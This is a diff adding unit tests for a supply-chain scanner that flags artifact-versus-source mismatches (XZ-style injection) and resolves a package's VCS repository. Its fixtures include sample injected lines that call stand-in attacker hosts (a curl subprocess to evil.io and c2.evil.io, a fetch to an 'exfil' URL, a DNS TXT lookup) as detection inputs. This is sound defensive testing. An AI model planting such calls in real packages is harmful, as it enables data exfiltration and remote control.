@@ -31,11 +31,14 @@ from activities.package_diff import (
     _added_lines_have_net_calls,
     _build_diff,
     _cargo_git_deps_added,
+    _compare_artifact_to_source,
     _composer_autoload_files_added,
     _composer_plugin_type_added,
+    _count_extra_lines,
     _diff_added_lines,
     _extract_and_diff,
     _get_file_map,
+    _get_vcs_repo_for_package,
     _go_sum_lines_removed,
     _has_binary_content,
     _has_obfuscation,
@@ -2413,3 +2416,184 @@ def test_added_lines_have_net_calls_cjs():
     assert _added_lines_have_net_calls(["dns.resolveTxt('c2.evil.io', cb)"], ".cjs") is True
     assert _added_lines_have_net_calls(["fetch('https://evil.io/exfil', opts)"], ".cjs") is True
     assert _added_lines_have_net_calls(["const result = compute(x);"], ".cjs") is False
+
+
+# ---------------------------------------------------------------------------
+# Artifact/source mismatch (XZ-style) — unit tests
+# ---------------------------------------------------------------------------
+
+
+def test_count_extra_lines_no_diff():
+    """Identical source and archive → empty list."""
+    src = "line1\nline2\nline3\n"
+    assert _count_extra_lines(src, src) == []
+
+
+def test_count_extra_lines_version_change_filtered():
+    """Pure version string change is filtered — not counted as unexplained."""
+    src = "__version__ = '1.0.0'\ndef foo(): pass\n"
+    archive = "__version__ = '1.1.0'\ndef foo(): pass\n"
+    extra = _count_extra_lines(src, archive)
+    assert extra == []
+
+
+def test_count_extra_lines_detects_injected_code():
+    """Injected lines beyond version string are returned."""
+    src = "__version__ = '1.0.0'\ndef foo(): pass\n"
+    injected = (
+        "__version__ = '1.1.0'\n"
+        "def foo(): pass\n"
+        "import subprocess; subprocess.run(['curl', 'http://evil.io'])\n"
+        "# evil line 2\n# evil line 3\n# evil line 4\n# evil line 5\n"
+    )
+    extra = _count_extra_lines(src, injected)
+    assert len(extra) >= 5
+
+
+@respx.mock
+async def test_get_vcs_repo_for_package_pip():
+    """PyPI project_urls Source Code field is parsed into a (platform, owner/repo) tuple."""
+    respx.get("https://pypi.org/pypi/requests/2.32.0/json").mock(
+        return_value=httpx.Response(
+            200,
+            json={
+                "info": {
+                    "name": "requests",
+                    "version": "2.32.0",
+                    "project_urls": {"Source Code": "https://github.com/psf/requests"},
+                    "home_page": "",
+                }
+            },
+        )
+    )
+    import httpx as _httpx
+
+    async with _httpx.AsyncClient() as client:
+        result = await _get_vcs_repo_for_package(client, "pip", "requests", "2.32.0")
+    assert result == ("github", "psf/requests")
+
+
+@respx.mock
+async def test_get_vcs_repo_for_package_npm():
+    """npm registry repository field is parsed correctly."""
+    respx.get("https://registry.npmjs.org/lodash/4.17.21").mock(
+        return_value=httpx.Response(
+            200,
+            json={
+                "repository": {"type": "git", "url": "https://github.com/lodash/lodash.git"}
+            },
+        )
+    )
+    import httpx as _httpx
+
+    async with _httpx.AsyncClient() as client:
+        result = await _get_vcs_repo_for_package(client, "npm", "lodash", "4.17.21")
+    assert result == ("github", "lodash/lodash")
+
+
+@respx.mock
+async def test_get_vcs_repo_for_package_unknown_ecosystem():
+    """Unsupported ecosystem returns None without making any HTTP calls."""
+    import httpx as _httpx
+
+    async with _httpx.AsyncClient() as client:
+        result = await _get_vcs_repo_for_package(client, "cargo", "serde", "1.0.0")
+    assert result is None
+
+
+@respx.mock
+async def test_compare_artifact_to_source_no_files():
+    """Empty artifact_files dict → (False, []) without any HTTP calls."""
+    import httpx as _httpx
+
+    async with _httpx.AsyncClient() as client:
+        mismatch, files = await _compare_artifact_to_source(client, "pip", "pkg", "1.0", {})
+    assert mismatch is False
+    assert files == []
+
+
+@respx.mock
+async def test_compare_artifact_to_source_no_vcs_repo():
+    """PyPI 404 for metadata → VCS lookup fails → (False, []) gracefully."""
+    respx.get("https://pypi.org/pypi/private-pkg/1.0/json").mock(
+        return_value=httpx.Response(404)
+    )
+    import httpx as _httpx
+
+    async with _httpx.AsyncClient() as client:
+        mismatch, files = await _compare_artifact_to_source(
+            client, "pip", "private-pkg", "1.0", {"__init__.py": "x = 1\n"}
+        )
+    assert mismatch is False
+    assert files == []
+
+
+@respx.mock
+async def test_compare_artifact_to_source_clean(monkeypatch):
+    """Archive matches git source → no mismatch."""
+    respx.get("https://pypi.org/pypi/mypkg/2.0/json").mock(
+        return_value=httpx.Response(
+            200,
+            json={
+                "info": {
+                    "project_urls": {"Source Code": "https://github.com/owner/mypkg"},
+                    "home_page": "",
+                }
+            },
+        )
+    )
+    # Simulate fetch_vcs_file_at_tag returning the same content as archive
+    source_text = "__version__ = '1.0'\ndef foo(): pass\n"
+    archive_text = "__version__ = '2.0'\ndef foo(): pass\n"
+
+    async def fake_fetch(platform, owner, repo, version, path, token):
+        return source_text
+
+    monkeypatch.setattr("activities.package_diff.fetch_vcs_file_at_tag", fake_fetch)
+
+    import httpx as _httpx
+
+    async with _httpx.AsyncClient() as client:
+        mismatch, files = await _compare_artifact_to_source(
+            client, "pip", "mypkg", "2.0", {"mypkg/__init__.py": archive_text}
+        )
+    # Only a version line changed — no unexplained lines
+    assert mismatch is False
+    assert files == []
+
+
+@respx.mock
+async def test_compare_artifact_to_source_detects_injection(monkeypatch):
+    """Archive contains injected lines absent from git source → mismatch flagged."""
+    respx.get("https://pypi.org/pypi/mypkg/2.0/json").mock(
+        return_value=httpx.Response(
+            200,
+            json={
+                "info": {
+                    "project_urls": {"Source Code": "https://github.com/owner/mypkg"},
+                    "home_page": "",
+                }
+            },
+        )
+    )
+    source_text = "__version__ = '1.0'\ndef foo(): pass\n"
+    archive_text = (
+        "__version__ = '2.0'\n"
+        "def foo(): pass\n"
+        "import subprocess; subprocess.run(['curl', 'http://c2.evil.io'])\n"
+        "# injected line 2\n# injected line 3\n# injected line 4\n# injected line 5\n"
+    )
+
+    async def fake_fetch(platform, owner, repo, version, path, token):
+        return source_text
+
+    monkeypatch.setattr("activities.package_diff.fetch_vcs_file_at_tag", fake_fetch)
+
+    import httpx as _httpx
+
+    async with _httpx.AsyncClient() as client:
+        mismatch, files = await _compare_artifact_to_source(
+            client, "pip", "mypkg", "2.0", {"mypkg/__init__.py": archive_text}
+        )
+    assert mismatch is True
+    assert "mypkg/__init__.py" in files
